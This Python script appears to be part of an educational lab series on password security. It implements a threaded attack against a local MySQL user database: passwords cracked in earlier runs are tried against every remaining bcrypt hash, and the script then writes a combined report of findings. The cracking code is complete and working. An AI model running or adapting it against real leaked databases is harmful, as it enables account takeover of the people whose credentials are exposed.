import bcrypt
import mysql.connector
from mysql.connector import Error
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import re
import time

# -------------------------
# ATTACK 5 — Credential Stuffing
#
# Scenario:
#   Attacks 1-4 cracked a number of passwords from this system.
#   A real attacker would take those cracked passwords and try them
#   against ALL other users — betting that multiple users share the
#   same weak password (e.g. more than one person used 'password').
#
#   This is credential stuffing from within — we know real passwords
#   from this system and spray them across every uncracked user.
#
# How it works:
#   1. Load all previously cracked passwords from A1-A4 results
#   2. Fetch all users who have NOT been cracked yet
#   3. Word-outer threaded loop: try every known password against all users
#   4. Any match = another user who reused the same password
#
# Expected result:
#   Users who share a password with an already-cracked user → CRACKED
#   Users with unique passwords                             → FAILED
# -------------------------

DB_CONFIG = {
    'host':     'localhost',
    'user':     'root',
    'password': 'root',
    'database': 'user_system'
}

SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(SCRIPT_DIR, "results")
OUTPUT_PATH = os.path.join(RESULTS_DIR, "a5_cracked.txt")

PREVIOUS_RESULTS = [
    os.path.join(RESULTS_DIR, "a1_cracked.txt"),
    os.path.join(RESULTS_DIR, "a2_cracked.txt"),
    os.path.join(RESULTS_DIR, "a3_cracked.txt"),
    os.path.join(RESULTS_DIR, "a4_cracked.txt"),
]

COMBINED_PATH = os.path.join(RESULTS_DIR, "combined_report.txt")

MAX_WORKERS = os.cpu_count() or 4


# -------------------------
# LOAD CRACKED PASSWORDS FROM PREVIOUS ATTACKS
#
# Handles two output formats:
#   A1/A2/A5 — explicit "CRACKED PASSWORDS:" section header,
#               then "username  password" lines beneath it
#   A4        — "Pepper : 'value'" metadata line, then flat
#               "username  password" lines (no section header)
#
# Returns (cracked_usernames_set, known_passwords_set)
# -------------------------
def load_previous_results(paths: list) -> tuple:
    cracked_users   = set()
    known_passwords = set()

    for path in paths:
        if not os.path.exists(path):
            continue

        in_cracked_section = False

        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()

                if line.startswith("CRACKED PASSWORDS"):
                    in_cracked_section = True
                    continue

                if in_cracked_section:
                    if not line or line.startswith(("-", "Username", "=")):
                        continue
                    parts = line.split()
                    if len(parts) >= 2:
                        cracked_users.add(parts[0])
                        known_passwords.add(parts[1])
                    continue

                # A4 flat format: "username  password" lines outside any section
                # Guard: skip metadata (lines with colons) and separators
                if line and ":" not in line and not line.startswith(("=", "-")):
                    parts = line.split()
                    # Require at least 2 parts and a plausible username
                    if len(parts) >= 2 and not parts[0][0].isdigit():
                        cracked_users.add(parts[0])
                        # parts[1] is the password — skip if it looks like a pepper repr
                        candidate_pw = parts[1]
                        if not candidate_pw.startswith(("'", '"')):
                            known_passwords.add(candidate_pw)

    print(f"  Previously cracked users : {len(cracked_users)}")
    print(f"  Known passwords to spray : {len(known_passwords)}")
    for pwd in sorted(known_passwords):
        print(f"    -> '{pwd}'")
    print()

    return cracked_users, known_passwords


# -------------------------
# FETCH UNCRACKED USERS
# Uses encrypted_nopep — same column as A1/A2/A3
# -------------------------
def fetch_uncracked_users(skip: set) -> list:
    try:
        conn   = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("SELECT userid, username, encrypted_nopep FROM users")
        all_users = cursor.fetchall()
        users = [(uid, un, h) for uid, un, h in all_users if un not in skip and h]
        print(f"  Total users in DB : {len(all_users)}")
        print(f"  Already cracked   : {len(skip)}")
        print(f"  Attacking         : {len(users)}\n")
        return users
    except Error as e:
        print(f"Database error: {e}")
        exit(1)
    finally:
        if 'cursor' in locals(): cursor.close()
        if 'conn'   in locals() and conn.is_connected(): conn.close()


# -------------------------
# SAVE A5 RESULTS
# -------------------------
def save_results(cracked: list, failed: list, elapsed: float,
                 total_attempts: int, total_users: int):
    os.makedirs(RESULTS_DIR, exist_ok=True)
    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n")
        f.write("  ATTACK 5 — Credential Stuffing Results\n")
        f.write(f"  Date      : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Cracked   : {len(cracked)} / {total_users}\n")
        f.write(f"  Failed    : {len(failed)} / {total_users}\n")
        f.write(f"  Attempts  : {total_attempts:,}\n")
        f.write(f"  Time      : {elapsed:.4f}s\n")
        f.write("=" * 60 + "\n\n")

        if cracked:
            f.write("CRACKED PASSWORDS:\n")
            f.write(f"{'Username':<30} {'Password'}\n")
            f.write("-" * 50 + "\n")
            for username, password in cracked:
                f.write(f"{username:<30} {password}\n")
        else:
            f.write("No passwords cracked.\n")
            f.write("Reason: No users shared a password with previously cracked accounts.\n")

    print(f"\nSaved -> {OUTPUT_PATH}")


# -------------------------
# BUILD COMBINED REPORT (covers A1-A5)
# -------------------------
def build_combined_report():
    attack_files = [
        ("Attack 1 — Dictionary",         os.path.join(RESULTS_DIR, "a1_cracked.txt")),
        ("Attack 2 — Brute Force",         os.path.join(RESULTS_DIR, "a2_cracked.txt")),
        ("Attack 3 — Rainbow Table",       os.path.join(RESULTS_DIR, "a3_cracked.txt")),
        ("Attack 4 — Pepper Guess",        os.path.join(RESULTS_DIR, "a4_cracked.txt")),
        ("Attack 5 — Credential Stuffing", OUTPUT_PATH),
    ]

    all_cracked = {}
    all_stats   = []

    for attack_name, path in attack_files:
        if not os.path.exists(path):
            all_stats.append((attack_name, 0, "N/A", "N/A", "N/A"))
            continue

        cracked_count      = 0
        attempts           = "N/A"
        elapsed            = "N/A"
        total_users        = "N/A"
        in_cracked_section = False

        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()

                if re.match(r"Cracked\s*:", line) and "/" in line:
                    try:
                        total_users = line.split("/")[-1].strip()
                    except Exception:
                        pass

                if re.match(r"Attempts\s*:", line):
                    attempts = re.split(r":\s*", line, maxsplit=1)[1].strip()

                if re.match(r"Time\s*:", line) and "Limit" not in line:
                    elapsed = line.split(":", 1)[1].strip()

                if line.startswith("CRACKED PASSWORDS"):
                    in_cracked_section = True
                    continue

                if in_cracked_section and line and not line.startswith(("-", "Username", "=")):
                    parts = line.split()
                    if len(parts) >= 2:
                        un, pw = parts[0], parts[1]
                        if un not in all_cracked:
                            all_cracked[un] = (pw, attack_name)
                        cracked_count += 1

        all_stats.append((attack_name, cracked_count, total_users, attempts, elapsed))

    os.makedirs(RESULTS_DIR, exist_ok=True)
    with open(COMBINED_PATH, "w", encoding="utf-8") as f:
        f.write("=" * 70 + "\n")
        f.write("  COMBINED ATTACK REPORT — Dictionary + Brute Force + Rainbow Table"
                " + Pepper Guess + Credential Stuffing\n")
        f.write(f"  Generated : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 70 + "\n\n")

        f.write("ATTACK SUMMARY\n")
        f.write("-" * 70 + "\n")
        total_attempts = 0
        for attack_name, cracked_count, total_users, attempts, elapsed in all_stats:
            f.write(f"  {attack_name}\n")
            f.write(f"    Cracked  : {cracked_count} / {total_users}\n")
            f.write(f"    Attempts : {attempts}\n")
            f.write(f"    Time     : {elapsed}\n\n")
            try:
                total_attempts += int(str(attempts).replace(",", ""))
            except ValueError:
                pass

        f.write(f"  Total Attempts: {total_attempts:,}\n")        
        f.write(f"  Total Cracked : {len(all_cracked)} unique users\n\n")

        f.write("=" * 70 + "\n")
        f.write("  ALL CRACKED PASSWORDS\n")
        f.write("=" * 70 + "\n")
        if all_cracked:
            f.write(f"  {'Username':<30} {'Password':<25} {'Cracked By'}\n")
            f.write("  " + "-" * 66 + "\n")
            for un, (pw, method) in sorted(all_cracked.items()):
                f.write(f"  {un:<30} {pw:<25} {method}\n")
        else:
            f.write("  No passwords cracked across all attacks.\n")

        f.write("\n" + "=" * 70 + "\n")
        f.write("  KEY FINDINGS\n")
        f.write("=" * 70 + "\n")
        f.write("  • Weak passwords cracked instantly by dictionary attack.\n")
        f.write("  • Brute force is impractical against bcrypt for anything > 4 chars.\n")
        f.write("  • Rainbow tables are entirely defeated by bcrypt per-user salts.\n")
        f.write("  • Pepper stops dictionary attacks — same weak passwords become\n")
        f.write("    uncrackable when the pepper is unknown.\n")
        f.write("  • Credential stuffing exploits password reuse at scale.\n")
        f.write("=" * 70 + "\n")

    print(f"Combined report saved -> {COMBINED_PATH}")


# -------------------------
# THREADED BCRYPT HELPER
# -------------------------
def _check_chunk(candidate: bytes, chunk: list) -> list:
    """Check one candidate against a chunk of users. Returns matched usernames."""
    hits = []
    for _uid, username, stored_hash in chunk:
        try:
            if bcrypt.checkpw(candidate, stored_hash):
                hits.append(username)
        except Exception:
            pass
    return hits


# -------------------------
# ATTACK
# Word-outer / user-inner loop with threading.
# Each known password is tried against all remaining uncracked users
# in parallel. Active list shrinks as users are cracked.
# -------------------------
def credential_stuffing_attack(users: list, known_passwords: set) -> dict:
    print("=" * 60)
    print("  ATTACK 5 — Credential Stuffing")
    print(f"  Spraying {len(known_passwords)} known password(s) across {len(users)} users")
    print(f"  Threads  : {MAX_WORKERS}")
    print("=" * 60 + "\n")

    cracked       = []
    cracked_users = set()
    start         = time.time()

    # Pre-encode hashes once
    user_hashes = [(uid, un, h.encode("utf-8")) for uid, un, h in users]

    for password in known_passwords:
        active = [(uid, un, h) for uid, un, h in user_hashes if un not in cracked_users]
        if not active:
            break   # everyone cracked — stop early

        candidate  = password.encode("utf-8")
        chunk_size = max(1, len(active) // MAX_WORKERS)
        chunks     = [active[i:i + chunk_size] for i in range(0, len(active), chunk_size)]

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(_check_chunk, candidate, c): c for c in chunks}
            for future in as_completed(futures):
                for username in future.result():
                    if username not in cracked_users:
                        cracked_users.add(username)
                        cracked.append((username, password))
                        print(f"[CRACKED] {username:<30} -> '{password}'")

    total_attempts = len(known_passwords) * len(users)
    failed         = [un for _, un, _ in users if un not in cracked_users]
    elapsed        = time.time() - start
    speed          = total_attempts / elapsed if elapsed > 0 else 0

    print(f"\n{'=' * 60}")
    print(f"  Cracked  : {len(cracked)} / {len(users)}")
    print(f"  Failed   : {len(failed)} / {len(users)}")
    print(f"  Attempts : {total_attempts:,}")
    print(f"  Time     : {elapsed:.2f}s")
    print(f"  Speed    : {speed:,.0f} attempts/sec")
    print(f"{'=' * 60}")
    print(f"\n  KEY FINDING: Cracking one account reveals all accounts sharing")
    print(f"  the same password — credential stuffing exploits this at scale.\n")

    save_results(cracked, failed, elapsed, total_attempts, len(users))
    build_combined_report()

    return {
        "cracked":     cracked,
        "failed":      failed,
        "attempts":    total_attempts,
        "time":        elapsed,
        "total_users": len(users),
    }


if __name__ == "__main__":
    print("=" * 60)
    print("  ATTACK 5 — Credential Stuffing")
    print("=" * 60 + "\n")

    cracked_users, known_passwords = load_previous_results(PREVIOUS_RESULTS)

    if not known_passwords:
        print("No known passwords found — run A1-A4 first.")
        exit(1)

    users = fetch_uncracked_users(cracked_users)

    if not users:
        print("All users already cracked by previous attacks.")
        exit(0)

    credential_stuffing_attack(users, known_passwords)